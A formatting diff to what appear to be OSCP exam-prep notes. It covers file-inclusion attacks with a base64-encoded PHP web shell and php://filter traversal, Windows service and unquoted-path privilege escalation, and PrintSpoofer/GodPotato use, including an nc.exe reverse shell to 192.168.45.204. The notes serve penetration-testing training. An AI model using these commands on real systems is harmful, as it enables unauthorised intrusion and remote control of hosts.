@@ -253,9 +253,9 @@ PostgreSQL:
 		
   		4. 
 		
-     			`echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
+     			echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 		   
-     			`curl "http://domain.com/index.php?page=data://text/plain;base64,<base64-encoded-string-here>&cmd=ls"`
+     			curl "http://domain.com/index.php?page=data://text/plain;base64,<base64-encoded-string-here>&cmd=ls"
 		
   		5. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/backup.php`
 		
@@ -708,11 +708,11 @@ c $1 $3 $7 $#
 		
    			1. access denied = enumerate Startup Type:
 			
-    				1. `Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'TargetService'}` (grab the Startup Type)
+    				1. Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'TargetService'} (grab the Startup Type)
 				
     				2. Startup Type = auto --> a reboot will restart it (SeShutdown is required)
 				
-    				3. `shutdown /r /t 0`
+    				3. shutdown /r /t 0
 		
   		5. `net start TargetService`
 		
@@ -756,7 +756,7 @@ c $1 $3 $7 $#
 		
    			1. (enumerate unquoted service paths for services outside the System32 directory; does not check for spaces in the binary paths)
 		
-  		4. Compile a [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c) with the name as the first word in a (writable) directory path with a space in it (ex: `C:\Program Files\Enterprise.exe)
+  		4. Compile a [malicious service](https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_service.c) with the name as the first word in a (writable) directory path with a space in it (ex: C:\Program Files\Enterprise.exe)
 		
   		5. `Restart-Service TargetService`         (this may show an error on success)
 	
@@ -794,11 +794,11 @@ c $1 $3 $7 $#
 		
    			1. [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)
 			
-    				1. `.\PrintSpoofer.exe -i -c powershell.exe`
+    				1. .\PrintSpoofer.exe -i -c powershell.exe
 			
    			2. [GodPotato](https://github.com/BeichenDream/GodPotato)
 			
-    				1. `.\GodPotato.exe -cmd "C:\Services\nc.exe -e cmd.exe 192.168.45.204 443"`
+    				1. .\GodPotato.exe -cmd "C:\Services\nc.exe -e cmd.exe 192.168.45.204 443"
 
 
 **Linux Privilege Escalation:**
